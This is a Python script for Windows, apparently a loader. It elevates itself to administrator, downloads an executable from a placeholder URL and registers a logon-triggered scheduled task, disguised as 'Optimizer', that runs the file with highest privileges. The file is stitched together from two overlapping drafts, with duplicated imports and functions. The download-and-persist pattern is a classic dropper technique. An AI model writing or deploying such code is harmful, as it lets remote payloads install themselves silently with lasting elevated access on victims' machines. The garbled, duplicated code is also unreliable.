import os
import sys
import ctypes
import subprocess

TASK_NAME = "Optimizer"
APP_NAME = "main.exe"


# -----------------------
# Admin check
# -----------------------
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def relaunch_as_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        sys.executable,
        # f'"{os.path.abspath(__file__)}"',
        None,
        None,
        1
    )
    sys.exit()


# -----------------------
# Create startup task
# -----------------------
def create_startup_task(exe_path):
    result = subprocess.run([
        "schtasks",
        "/create",
        "/tn", TASK_NAME,
        "/tr", f'"{exe_path}"',
        "/sc", "ONLOGON",
        "/rl", "HIGHEST",
        "/f"
    ], capture_output=True, text=True)

    if result.returncode != 0:
        print("❌ Failed to create task:")
        print(result.stderr)
    else:
        print("✅ Startup task created")
import requests

def download_exe(url, app_name):
    try:
        with requests.get(url, stream=True, timeout=10) as response:
            response.raise_for_status()

            with open(app_name, "wb") as file:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)

        return True

    except requests.RequestException as e:
        print(f"Error descargando archivo: {e}")
        return False
# -----------------------
# Main
# -----------------------
import os
import sys
import ctypes
import subprocess
import requests

TASK_NAME = "Optimizer"
APP_NAME = "main.exe"
DOWNLOAD_URL = "https://miurl.com/exe"


# -----------------------
# Admin check
# -----------------------
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def relaunch_as_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        sys.executable,
        os.path.abspath(__file__),
        None,
        1
    )
    sys.exit()


# -----------------------
# Download EXE
# -----------------------
def download_exe(url, app_name):
    try:
        with requests.get(url, stream=True, timeout=10) as response:
            response.raise_for_status()

            with open(app_name, "wb") as file:
                for chunk in response.iter_content(8192):
                    if chunk:
                        file.write(chunk)

        return True

    except requests.RequestException as e:
        print(f"Error descargando archivo: {e}")
        return False


# -----------------------
# Create startup task
# -----------------------
def create_startup_task(exe_path):
    result = subprocess.run([
        "schtasks",
        "/create",
        "/tn", TASK_NAME,
        "/tr", exe_path,
        "/sc", "ONLOGON",
        "/rl", "HIGHEST",
        "/f"
    ], capture_output=True, text=True)

    if result.returncode != 0:
        print("❌ Failed to create task:")
        print(result.stderr)
    else:
        print("✅ Startup task created")


# -----------------------
# Main
# -----------------------
def main():
    if not is_admin():
        relaunch_as_admin()

    exe_path = os.path.abspath(APP_NAME)

    if not os.path.exists(exe_path):
        ok = download_exe(DOWNLOAD_URL, APP_NAME)
        if not ok:
            return

    create_startup_task(exe_path)

    print("✔ Will now run at startup with admin rights")


if __name__ == "__main__":
    main()